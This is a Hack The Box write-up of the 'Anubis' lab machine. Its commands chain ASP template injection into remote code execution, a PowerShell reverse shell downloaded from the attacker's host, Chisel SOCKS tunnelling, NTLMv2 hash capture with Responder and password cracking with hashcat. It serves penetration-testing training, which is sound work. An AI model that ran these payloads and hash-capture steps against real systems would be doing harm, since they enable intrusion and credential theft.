---
layout: post
title:  "Anubis Writeup - Hack The Box"
date:   2024-06-10
desc: ""
keywords: "HTB,OSEP,OSCP,eWPT,eWPTXv2,OSWE,eCPPTv2,Windows,ActiveDirectory,SSLCertificate,XSS,ASPSSTI,SOCKS5,Responder,Jamovi,AbusingCertificateServices,Insane"
categories: [HTB]
tags: [HTB,OSEP,OSCP,eWPT,eWPTXv2,OSWE,eCPPTv2,Windows,ActiveDirectory,SSLCertificate,XSS,ASPSSTI,SOCKS5,Responder,Jamovi,AbusingCertificateServices,Insane]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The following **Writeup** is a <ins>great challenge</ins>, due to the complexity of the attacks and the diversity of concepts to be applied in each attempt to hack the **Anubis** box of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**. Not for nothing is cataloged as **Insane**, and the truth is that I had to read and research different resources on the **Internet**, in addition to the help of the **[hack4u](https://hack4u.io/){:target="_blank"}** community or excellent resources from **[HackTricks](https://book.hacktricks.xyz/){:target="_blank"}** every time I got stuck. The machine has the particularity of having different ways to escalate privileges, I'm going to choose the easiest one and then try other ways as an exercise. But first I will enter the platform and spawn the machine.

<br /><br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_000.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once the machine is deployed on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, I can check the connectivity with `ping` and use `nmap` to obtain information about the ports and services exposed to the outside. The <ins>**Reconnaissance phase** has started</ins> and I notice several interesting things, such as the **Common Name** and that the **RPC** protocol is enabled. With `smbclient` and `smbmap` I try to access shared resources but I will need valid credentials, I can't enumerate the system with `rpcclient` either. If I use `openssl` to scan the **HTTPS** service certificate on port **443**, I can't find anything so far, beyond the **Common Name**. If I add the **windcorp.htb** domain to my `hosts` file and scan it with `whatweb`, I get nothing (I test this in case virtual hosting is being implemented), but if I add the **Subdomain** I get information about the technologies with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**.

> The **[Common Name](https://knowledge.digicert.com/solution/what-is-a-common-name){:target="_blank"}** (**CN**), also known as the **Fully Qualified Domain Name** (**FQDN**), is the characteristic value within a **Distinguished Name** (**DN**). Typically, it is composed of **Host Domain Name** and looks like, **"www.digicert.com"** or **"digicert.com"**. The **Common Name** field is often misinterpreted and is filled out incorrectly. Do not use your organization's name as your common name.

> A **Remote Procedure Call** (**RPC**) is a software communication protocol that one program uses to request a service from another program located on a different computer and network, without having to understand the network's details.

```bash
smbclient -L 10.10.11.102 -N                  # :(
smbmap -H 10.10.11.102 -u 'null'              # :(
rpcclient -U "" 10.10.11.102 -N               # :(

openssl s_client --connect 10.10.11.102:443
nvim /etc/hosts
ping -c 1 windcorp.htb
whatweb https://windcorp.htb                  # :(

nvim /etc/hosts
ping -c 1 www.windcorp.htb
whatweb https://www.windcorp.htb              # :)

curl -s -X GET https://windcorp.htb/
curl -s -X GET https://windcorp.htb/ -I
curl -s -X GET -k -I https://www.windcorp.htb/ | grep Server -i
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_001.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_002.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_003.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_004.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_005.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_006.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As usual, I am going to start investigating the **HTTPS** web service, I find some possible usernames that I can use later, besides a **Contact** form, <ins>which works</ins> and also the data that I enter is reflected in the page. If I analyze the source code I see that when the data is sent a **save.asp** script is executed, with `wfuzz` I search for directories or hidden files, I find some but nothing that gives me much help to find any point of attack.

> A **.asp** file or an active server page file is an **ASP.NET** typed webpage or web document that contains **HTML** codes, text, graphics, and **XML**. A Microsoft IIS server processes all the scripts within the file and generates **HTML** code to display the page in a web browser.

> **[ASP.NET](https://dotnet.microsoft.com/en-us/learn/aspnet/what-is-aspnet){:target="_blank"}** is an open source web framework, created by **Microsoft**, for building modern web apps and services with **.NET**. **ASP.NET** is cross platform and runs on **Windows**, **Linux**, **macOS**, and **Docker**.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://www.windcorp.htb/FUZZ
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-asp-jpg-png https://www.windcorp.htb/FUZZ.FUZ2Z
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_007.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_008.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_009.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_010.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_011.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_012.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_013.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_014.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to test some vulnerabilities in the contact form, **HTML** injections and **XSS** work, but I don't see a way to use them to leak information or transform them into a **RCE**. But if I do some research on the **Internet** I find a very interesting article, **[“Code Injection to RCE with .NET”](https://blog.stratumsecurity.com/2024/04/29/code-injection-to-rce-with-net/){:target="_blank"}**, that talks about web application templates vulnerable to code injections. I just have to keep looking a little more and I find another resource **[“RCE via SSTI”](https://shuciran.github.io/posts/RCE-via-SSTI/){:target="_blank"}** from which I can get the code to exploit the **SSTI** and try the command execution. First I inject a command with a mathematical calculation and it works, now I just have to get a **RCE**, for that I turn to the **[Hacking Dream](https://www.hackingdream.net/){:target="_blank"}** page with its article **[“Reverse Shells/ Web Shells Cheat sheet for Penetration Testing - OSCP”](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html){:target="_blank"}** that give me all the necessary information and I try to send me a **trace** with `ping` from the victim machine to the attacker and I do it successfully.

```bash
#   ASP --> <%response.write (7*7)%>
#   ASP --> <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

#   --> <%response.write (4*4)%>
#   --> <%response.write CreateObject("WScript.Shell").Exec("whoami").StdOut.Readall()%>

tcpdump -i tun0 icmp -n
#   --> <%response.write CreateObject("WScript.Shell").Exec("ping -n 2 10.10.14.3").StdOut.Readall()%>
#   --> <%response.write CreateObject("WScript.Shell").Exec("cmd /c ping 10.10.14.3").StdOut.Readall()%>
#   :) I receive traces!!
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_015.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_016.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_017.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_018.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_019.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I just need to send me a **Reverse Shell**, for that I will use a **[Nishang](https://github.com/samratashok/nishang){:target="_blank"}** script, I just need to modify it a little bit and add at the end of the script the necessary command to send the shell once it is interpreted. I am also going to be cautious and follow the recommendations in the article **[“Hacktricks Basic PowerShell for Pentesters”](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters){:target="_blank"}** and encode the command in **Little Endian** and then in **Base64**, to avoid problems in the interpretation. Now I just need to create a server with `python` to make the **[Nishang](https://github.com/samratashok/nishang){:target="_blank"}** script available and inject the command into the form to get the **Reverse Shell**. Then I will migrate to the **[ConPtyShell](https://github.com/antonioCoco/ConPtyShell){:target="_blank"}** shell, which is more stable and efficient, I just have to adapt the script to add the end with the command using the number of rows and columns of my terminal and share it by opening a local server. Once the migration is done, I run some recognition commands and I find out that I accessed a **container**, so my field of action is reduced to escape from the container or find some kind of sensitive information in it.

> **Attacker Machine**:

```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
nvim PS.ps1
cat PS.ps1 | tail -n 2
#     --> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 443

# For security:
nvim rce_command.txt
#     --> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PS.ps1')

cat rce_command.txt | xxd
cat rce_command.txt | xxd                                     # <-- tranform this
cat rce_command.txt | iconv -t UTF-16LE | xxd                 # <-- Encoded
cat rce_command.txt | iconv -t UTF-16LE | base64; echo        # <-- Better!
cat rce_command.txt | iconv -t UTF-16LE | base64 -w 0; echo

python3 -m http.server 80
rlwrap -cAr nc -nlvp 443
# --> <%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBQAFMALgBwAHMAMQAnACkACgA=").StdOut.Readall()%>
```

> **Victime Machine**:

```cmd
whoami      --> nt authority\system          # ??
hostname    --> webserver01
ipconfig
# --> IPv4 Address. . . . . . . . . . . : 172.25.133.37     Container !
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
mv Invoke-ConPtyShell.ps1 ConPtyShell.ps1
stty size
# 9 128
nvim ConPtyShell.ps1
cat ConPtyShell.ps1 | tail -n 2 
# --> Invoke-ConPtyShell -RemoteIp 10.10.14.3 -RemotePort 443 -Rows 29 -Cols 128

# Share Invoke-ConPtyShell.ps1
python3 -m http.server 80
nc -nlvp 443
```

> **Victime Machine**:

```cmd
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/ConPtyShell.ps1')      # :(
# --> 'powershell.exe' failed to run: The filename or extension is too long
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
nc -nlvp 443
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/ConPtyShell.ps1')                 # :)
# [Enter] [Ctrl^Z]
stty raw -echo; fg
# [Enter] (several times)

whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_020.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_021.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_022.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_023.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_024.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_025.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_026.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_027.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I do the recon tasks in the container, I have administrator privileges but they don't make much sense in the context I'm in, at the moment. I find some logs without important content, if I look for some flags they are not in the container, but if I look on the desktop I find a key that may be from the **SSH** service. I create a file with the content I just found and the binary `file` tells me it is a **.pem** certificate request so I turn to **[HackTricks](https://book.hacktricks.xyz/crypto-and-stego/certificates){:target="_blank"}** for information on how to analyze it, but if I try to open it as an **X.509** certificate I get an error. So it must be a **Certificate Signing Request (CSR)**, so I look for a **[way to open it](https://www.sslshopper.com/article-most-common-openssl-commands.html){:target="_blank"}** and now I succeed, so I succeed in leaking some information, such as a **new subdomain**. I modify my `hosts` file so that my machine resolves well when I try to make a request with `curl` or I try to access from my browser, but I do not succeed, maybe it is only accessible from the container.

> **Victime Machine**:

```cmd
whoami /priv
#    --> SeImpersonatePrivilege <-- But I'm the Administrator user in a container :(
whoami /all

cd C:\inetpub\logs\LogFiles
type u_ex210426.log
...

cmd /c dir /s user.txt
cmd /c dir /s root.txt

net users
cd C:\
cd C:\Users\Administrator\Desktop
dir
#  --> req.txt
type req.txt
```

***[OpenSSL Generated Key File Formats](https://serverfault.com/questions/9708/what-is-a-pem-file-and-how-does-it-differ-from-other-openssl-generated-key-file){:target="_blank"}***:

> **.csr** - This is a Certificate Signing Request. Some applications can generate these for submission to certificate-authorities. The actual format is PKCS10 which is defined in RFC 2986. It includes some/all of the key details of the requested certificate such as subject, organization, state, whatnot, as well as the public key of the certificate to get signed.

> **.pem** (**Privacy Enhanced Mail**) - Defined in **RFC 1422** (part of a series from 1421 through 1424) this is a container format that may include just the public certificate (such as with Apache installs, and CA certificate files /etc/ssl/certs), or may include an entire certificate chain including public key, private key, and root certificates.

> **.key** - This is a (usually) PEM formatted file containing just the private-key of a specific certificate and is merely a conventional name and not a standardized one.

> **.pkcs12** **.pfx** **.p12** - Originally defined by RSA in the Public-Key Cryptography Standards (abbreviated PKCS), the "12" variant was originally enhanced by Microsoft, and later submitted as RFC 7292. This is a password-protected container format that contains both public and private certificate pairs. Unlike .pem files, this container is fully encrypted.

> **Attacker Machine**:

```bash
nvim key
cat !$
file !$
#  --> PEM certificate request

mv key certificate
openssl x509 -in certificate -text -noout               # :(
#    --> Could not find certificate from certificate

mv certificate certificate.csr
openssl req -text -noout -verify -in certificate.csr
#    --> Certificate request self-signature verify OK      :)
#    --> CN = softwareportal.windcorp.htb                  Subdomain

nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 softwareportal.windcorp.htb
curl -s -X GET https://softwareportal.windcorp.htb -k     # :(
curl -s -X POST https://softwareportal.windcorp.htb -k    # :(
# https://softwareportal.windcorp.htb/            :(
```

> Generally speaking **[X.509 certificate](https://medium.com/@schartz/x-509-certificates-explained-11136392ee10){:target="_blank"}** refers to **IETF’s** (**Internet Engineering Task Force**) PKIX certificate and CRL profile of the X.509 certificate v3 standard. Yes there are versions of this thing. This version is specified in RFC 5280. It is also known as PKIX, full form being “Public Key Infrastructure (X.509)”

> A **[Certificate Signing Request (CSR)](https://www.globalsign.com/en/blog/what-is-a-certificate-signing-request-csr){:target="_blank"}** is one of the first steps towards getting your own **SSL/TLS** certificate. Generated on the same server you plan to install the certificate on, the **CSR** contains information (e.g. common name, organization, country) the **Certificate Authority** (**CA**) will use to create your certificate. It also contains the public key that will be included in your certificate and is signed with the corresponding private key.

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_028.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_029.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_030.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_031.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_032.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_033.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_034.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If with `ipconfig` I look at the network settings, I find an **IP** address corresponding to a **DNS** server, which most likely is the **Windows** machine I am trying to access, with `curl` and `iwr` I can check that there is an **HTTP** service running on it. I am going to do some research on the architecture of the machine, because I am going to resort to **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}** to create a tunnel and use the **SOCKS** internet protocol to access the network segment that I can't reach from my attacking machine. I am going to download the repository on my machine and then compile the `chisel` binary with `go` (I also compress it with `upx`) and run it on my machine in server mode, then I download the compiled binary for the **Windows** machine to transfer it to the container, and I can create the tunnel.

> **Victime Machine**:

```cmd
ipconfig
#    --> IPv4 Address. . . . . . . . . . . : 172.25.133.37
ipconfig /all
#    --> DNS Servers . . . . . . . . . . . : 172.25.128.1        <-- I have to reach this network segment
curl https://172.25.128.1                                 # :(
curl http://172.25.128.1                                  # :)
iwr -uri http://172.25.128.1                              # :)
```
> **[SOCKS](https://en.wikipedia.org/wiki/SOCKS){:target="_blank"}** is an **Internet protocol** that exchanges network packets between a client and server through a proxy server. **SOCKS5** optionally provides authentication so only authorized users may access a server. Practically, a **SOCKS** server proxies **TCP** connections to an arbitrary **IP** address, and provides a means for **UDP** packets to be forwarded. A **SOCKS** server accepts incoming client connection on **TCP** port **1080**, as defined in **RFC 1928**.

> **Attacker Machine**:

```bash
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags '-s -w' .
upx chisel
du -hc chisel
#  --> 3.5M
```

> **Victime Machine**:

```cmd
systeminfo
# --> System Type:               x64-based PC
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/chisel_1.9.1_windows_amd64.gz chisel.exe.gz
gunzip chisel.exe.gz
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil -urlcache -f -split http://10.10.14.10/chisel.exe
# OR:
# iwr -uri http://10.10.14.10/chisel.exe -OutFile chisel.exe
.\chisel.exe      :)
```

> **Attacker Machine**:

```bash
./chisel server --reverse -p 1234
# Or:
# ./chisel server -reverse -p 1234 --socks5
```

> **Victime Machine**:

```cmd
.\chisel.exe client 10.10.14.10:1234 R:socks
# Or:
# .\chisel.exe client 10.10.14.10:1234 R:127.0.0.1:socks
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_035.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_036.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_037.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_038.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_039.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_040.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_041.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_042.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_043.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I have to modify my [Proxychains configuration file](https://dranolia.medium.com/understanding-proxychains4-conf-anonsurf-in-kali-linux-46471260e499){:target="_blank"} to enable the **SOCKS5** proxy server on port **1080** (which `chisel` uses by default), then I update my `hosts` file with the domain but with the **DNS** server **IP** that I found in the container. I perform some tests with `ping` and `curl` to see that everything works correctly, and I achieve to access the content of the **HTTP** service. In my browser I add a new proxy with the settings but when accessing it does not load the page correctly. I analyze the traffic with the **Debugger** of the browser and it is trying to load **Internet** resources that it does not find, because it does it from the Windows machine that does not have access to **Internet**, I will add the domain through **Patterns** to the **whitelist** and with that I manage to solve the problem. Once everything works as it should I can use `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** to get information of the implemented technologies.

```bash
nvim /etc/proxychains4.conf
cat /etc/proxychains4.conf | grep 'strict_chain' -C 1
#    --> strict_chain
cat /etc/proxychains4.conf | grep '^socks5'
#    --> socks5  127.0.0.1 1080

nvim /etc/hosts
cat /etc/hosts | tail -n 1
#    --> 172.25.128.1  softwareportal.windcorp.htb

curl -s -X GET https://softwareportal.windcorp.htb -k                       # :(
curl -s -X GET http://softwareportal.windcorp.htb                           # :(
proxychains curl -s -X GET https://softwareportal.windcorp.htb -k           # :(
proxychains curl -s -X GET http://softwareportal.windcorp.htb               # :)

ping -c 1 softwareportal.windcorp.htb
proxychains ping -c 1 softwareportal.windcorp.htb                           # :)

proxychains curl -s -X GET http://softwareportal.windcorp.htb | html2text
#     :)

# Browser --> Preferences --> Proxy --> Configuration --> Manual Configuration
#      --> SOCKS Server 127.0.0.1    1080

# http://softwareportal.windcorp.htb/         :(

# Add wildcard!
# http://softwareportal.windcorp.htb/         :)
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_044.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_045.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_046.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_047.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_048.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_049.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_050.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_051.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_052.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_053.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I access the page and browse it a little to find some attack vector, there is a very striking functionality that allows me to install some executables from the victim machine, everything makes me think of a possible **[SSRF](https://portswigger.net/web-security/ssrf){:target="_blank"}** but I can not imagine how to exploit it. After thinking for a while, I think that maybe **credentials** or **sensitive data** are being handled in the requests and responses. From my console I make a request with `curl`, but with the safeguard of using my **IP** in the **URL** and I also capture the traffic to my machine with `tcpdump`. Then with `tshark` I analyze the capture, discard those packets directed to the `chisel` server, and from the rest there are some packets sent to port **5985** (**[WinRM](https://learn.microsoft.com/es-es/windows/win32/winrm/portal){:target="_blank"}**). Now if with `nc` I open my port **5985**, maybe I capture some more information, I make a new request with `curl` and I obtain very valuable information, among which an **Authorization Header** with a string in **Base 64**, that after decoding it `base64`, it seems to be a **NTLM** hash.

```bash
# http://softwareportal.windcorp.htb/install.asp?client=172.23.36.102&software=7z1900-x64.exe         ?? Too slow
# --> 7-zip           ?

proxychains whatweb http://softwareportal.windcorp.htb/
proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=172.25.133.37&software=gimp-2.10.24-setup-3.exe'
proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=172.25.133.37&software=gimp-2.10.24-setup-3.exe' | html2text

tcpdump -i tun0 -w capture.cap -v
proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.10&software=gimp-2.10.24-setup-3.exe'

tshark --help
# --> -r <infile>, --read-file <infile> set the filename to read from (or '-' for stdin)
tshark -r capture.cap 2>/dev/null
# --> 49918 → 1234            Chisel      <-- Delete noise

tshark -r capture.cap 2>/dev/null | grep -v 1234
# --> 103   5.134761 10.10.11.102 → 10.10.14.10  TCP 52 57545 → 5985        <-- my WinRm!!!

nc -nvlp 5985
proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.10&software=gimp-2.10.24-setup-3.exe'
# --> Authorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAGNFAAAADw==

echo 'TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAGNFAAAADw==' | base64 -d; echo
# --> NTLMSSP             Hash?
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_054.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_055.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_056.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_057.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_058.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_059.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_060.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_061.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As it seems that hashes are being sent, I will appeal to the `responder` spoofing functionality, and I get a **NTLMv2** hash. I have at my disposal the `hashcat` tool to try to crack the hash, I just have to look for the right mode and after a little while it leaks me the password. With `rpcclient` I can list users and groups of the **Domain Controller**, which tells me that there is the group **Domain Admins** only has one object (**Administrator**).

```bash
responder -I tun0
proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.10&software=gimp-2.10.24-setup-3.exe'
#    --> NTLMv2 Hash     : localadmin::windcorp:3006fe3279d1566e:1B563F528E1ADD639BAA63771BFEC55C:010100000000000002C190001ABADA017739D693916019FE00000000020008004B00500046004A0001001E00570049004E002D00450042004D0052005400440053005100440058004600040014004B00500046004A002E004C004F00430041004C0003003400570049004E002D00450042004D00520054004400530051004400580046002E004B00500046004A002E004C004F00430041004C00050014004B00500046004A002E004C004F00430041004C0008003000300000000000000000000000002100001FCF2BD5C9E1C6EA99EB52053BC176170A8884F529EB8816AD2A079A96ACA6B20A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00310030000000000000000000

nvim hashNTLMv2
hashcat --example-hash | grep -i 'ntlmv2' -A 5 -B 1
# Hash mode #5600
# Name................: NetNTLMv2
hashcat -a 0 -m 5600 hashNTLMv2 /usr/share/wordlists/rockyou.txt
# :)
# Or:
# john --wordlist=/usr/share/wordlists/rockyou.txt hash               :)

rpcclient -U "localadmin%Secret123" 10.10.11.102                      # :)
  > enumdomusers
  > enumdomgroups
rpcclient -U "localadmin%Secret123" 10.10.11.102 -c "querygroupmem 0x200"
#  --> 1 user only
rpcclient -U "localadmin%Secret123" 10.10.11.102 -c "queryuser 0x1f4"
#  --> Administrator
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_062.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_063.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_064.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_065.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_066.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_067.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_068.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_069.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

